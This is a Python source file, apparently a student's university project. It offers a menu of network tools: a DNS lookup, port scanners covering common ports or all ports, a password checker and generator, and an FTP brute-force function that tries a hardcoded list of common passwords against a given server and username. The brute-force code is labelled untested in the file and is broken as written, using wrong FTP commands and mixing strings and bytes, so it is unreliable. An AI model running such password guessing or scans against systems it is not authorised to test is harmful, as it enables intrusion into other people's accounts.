import socket
import re
import time
import random
import string

# Meu projeto final de python de quando estudava na UFRJ - Quis fazer algo que estava além do que foi ensinado.
# Projeto de 2020 feito com as aulas q eu estava estudando da Desec e com as aulas da faculdade.
# Em 2024 deixei as escritas em inglês e corrigi alguns bugs, além de ter terminado as funções que estavam incompletas.

def host():
    ''' Função pra pegar o IP de qualquer site especificado'''
    site = input("Get IP from: ")
    ip = socket.gethostbyname(site)
    conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('The IP Address from\n',site,'is:\n','**',ip,'**')
    time.sleep(1)
    print("                         ")
    leave()
    return 0
    
def scanPortas():
    ''' Função que scaneia qual das principais portas estão abertas'''
    ip = input("IP Address: ")
    print("Scanning...")
    print("It can take some time.")
    portas = [80,443,21,22,53,8080,3306,3389]
    for i in range(len(portas)):
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if conexao.connect_ex((ip,portas[i])) == 0:
            print("Porta",portas[i]," ** OPEN! **")
        else:
            print("Porta",portas[i]," *  CLOSED  *")
    time.sleep(1)
    print("                         ")
    leave()
    return 0

def deepScanPortas():
    ''' Função que scaneia qual de todas as 65534 portas estão abertas'''
    ip = input("IP Address: ")
    print("Scanning...")
    print("It can take some time.")
    ports = list(range(1,65535)) #de 1 a 65534 q são todas as portas (demora mt)
    for i in range(len(ports)):
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if conexao.connect_ex((ip,ports[i])) == 0:
            print("Porta",ports[i],"** OPEN! **")
        else:
            print("Porta",ports[i],"*  CLOSED  *")
    time.sleep(1)
    print("                         ")
    leave()
    return 0

def senhaForte(senha):
    ''' Função que testa se a senha fornecida é forte'''
    if len(senha) < 8:
        print("Add more characters")
        return leave()

    if not any(char.isdigit() for char in senha):
        print("Add numbers")
        return leave()

    if not any(char.isalpha() for char in senha):
        print("Add any letters")
        return leave()

    if not any(char.isupper() for char in senha):
        print("Add capital letters")
        return leave()

    if not any(char.islower() for char in senha):
        print("Add lowercase letters")
        return leave()

    if not any(char in string.punctuation for char in senha):
        print("Add special character")
        return leave()

    print("Strong Password!!")
    return leave()
    
    
def senhaGerar(tamanho=16):
    ''' Função que gera uma senha forte para o usuário entre 8 a 16 caracteres'''
    caracteres = string.ascii_letters + string.digits + string.punctuation
    if tamanho < 8:
        print("Wrong Length (Try 8-16)")
        return None
    senha = ''.join(random.choice(caracteres) for _ in range(tamanho))
    return senha

# Ainda não testado - feito junto da aula de um curso
def bruteforceFTP():
    ''' Função que faz o ataque de força bruta num servidor FTP dado para quebrar a senha'''
    ftp = input('Server IP? ')
    usuario = input('Username? ')
    lista = ['admin','123','adm123','root','Admin123@', 'Admin', 'toor', 'admin123'] #senhas pro brute force ()podendo ser uma wordlist em arquivo, tendo q usar o open() -> file = open(wordlist.txt)
    for linha in range(len(lista)):
        print("Testando> ",usuario,'::',lista[linha])
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conexao.connect((ftp,21)) #porta padrão 21
        conexao.send("User: "+usuario+"\r\n")
        conexao.recv(1024)
        conexao.send("Pass: "+lista[linha]+"\r\n")
        resulta = conexao.recv(1024)
        conexao.send("Fim\r\n")
        if re.search("230",resulta):
            print("*PASS FOUND!!* => ",lista[linha])
            break
        else:
            print("Error...\n")
    return leave()

def leave():
    ''' Função que faz o usuário retornar para o menu principal apenas após digitar algo '''
    algo = input("Press Enter to leave ")
    if algo == '':
        time.sleep(2)
        main()
    else:
        print("Not Valid. Bye")
        exit(1)
    return 0


def main():
    '''Função padrão: Menu do programa'''
    print("=========================")
    print("                         ")
    print("-------------------------")
    print("   Basic Pyckage Tools   ")
    print("-------------------------")
    print("                         ")
    print("=========================")
    print("_________________________")
    print("                         ")
    print("      UFRJ TRAB COMP     ")
    print("_________________________")
    print("       Professores:      ")
    print("   Jose Sapienza Ramos   ")
    print("     Rodrigo Guerchon    ")
    print("_________________________")
    print("          Aluno:         ")
    print("      Matheus Laidler    ")
    print("_________________________")
    print("                         ")
    print("+++++++++++++++++++++++++")
    print("=========================")
    print("          MENU           ")
    print("=========================")
    print("+++++++++++++++++++++++++")
    print("                         ")
    print("-------------------------")
    print("                         ")
    print(" (a) DNS Resolver")
    print(" (b) Port Scan")
    print(" (c) Pass Manager ")
    print(" (d) FTP Brute Force ")
    print("                         ")
    print("-------------------------")
    resp = input("> ")
    print("-------------------------")
    if resp == 'a':
        host()
    if resp == 'b':
        print("1 Simple (default ports)?")
        print("2 Advanced (65534 ports)?")
        print("-------------------------")
        s = int(input(">"))
        if s == 1:
            scanPortas()
        elif s == 2:
            deepScanPortas()
        else:
            return "error"
        time.sleep(2)
        main()
        
    if resp == 'c':
        print("1 SafePassVerify ")
        print("2 SafePassGenarate ")
        print("-------------------------")
        k = int(input(">"))
        if k == 1:
            senha = input("Type> ")
            print(senhaForte(senha))
            leave()
        elif k == 2:
            tamanho = int(input("Comprimento: "))
            print(senhaGerar(tamanho))
            leave()
        else:
            return "error"
        time.sleep(2)
        main()
            
    if resp == 'd':
        print('FTP Server BruteForce')
        print("-------------------------")
        bruteforceFTP()

#main()

if __name__ == "__main__":
    main()